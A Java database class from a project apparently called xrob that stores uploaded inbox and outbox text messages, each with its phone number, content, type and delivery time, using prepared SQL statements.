package com.theah64.xrob.api.database.tables;


import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Message;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.SQLException;

/**
 * Created by theapache64 on 9/4/16.
 */
public class Messages extends BaseTable<Message> {

    private static final String KEY_INBOX = "inbox";
    private static final String KEY_OUTBOX = "outbox";
    private static final String COLUMN_PHONE = "phone";
    private static final String COLUMN_CONTENT = "content";
    private static final String COLUMN_DELIVERED_AT = "delivered_at";
    private static final String TYPE_INBOX = "inbox";
    private static final String TYPE_OUTBOX = "outbox";
    private static Messages instance = new Messages();

    public static Messages getInstance() {
        return instance;
    }

    @Override
    public boolean add(final String userId, JSONObject jOb) {

        boolean isAdded = true;

        final String query = "INSERT INTO messages (user_id,phone,content,_type,delivered_at) VALUES (?,?,?,?,?);";
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);

            if (jOb.has(KEY_INBOX)) {

                //Saving inbox message
                try {
                    final JSONArray jaInbox = jOb.getJSONArray(KEY_INBOX);

                    for (int i = 0; i < jaInbox.length(); i++) {

                        final JSONObject jInMessage = jaInbox.getJSONObject(i);
                        final String phone = jInMessage.getString(COLUMN_PHONE);
                        final String content = jInMessage.getString(COLUMN_CONTENT);
                        final long deliveryTimestamp = jInMessage.getLong(COLUMN_DELIVERED_AT);

                        ps.setString(1, userId);
                        ps.setString(2, phone);
                        ps.setString(3, content);
                        ps.setString(4, TYPE_INBOX);
                        ps.setLong(5, deliveryTimestamp);

                        isAdded = ps.executeUpdate() == 1 && isAdded;
                    }

                } catch (JSONException e) {
                    e.printStackTrace();
                    isAdded = false;
                }
            }

            if (jOb.has(KEY_OUTBOX)) {

                //Saving outbox message
                try {
                    final JSONArray jaOutbox = jOb.getJSONArray(KEY_OUTBOX);

                    for (int i = 0; i < jaOutbox.length(); i++) {
                        final JSONObject jInMessage = jaOutbox.getJSONObject(i);
                        final String phone = jInMessage.getString(COLUMN_PHONE);
                        final String content = jInMessage.getString(COLUMN_CONTENT);
                        final long deliveryTimestamp = jInMessage.getLong(COLUMN_DELIVERED_AT);

                        ps.setString(1, userId);
                        ps.setString(2, phone);
                        ps.setString(3, content);
                        ps.setString(4, TYPE_OUTBOX);
                        ps.setLong(5, deliveryTimestamp);

                        isAdded = ps.executeUpdate() == 1 && isAdded;
                    }

                } catch (JSONException e) {
                    e.printStackTrace();
                    isAdded = false;
                }
            }

            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
            isAdded = false;
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }


        return isAdded;
    }
}
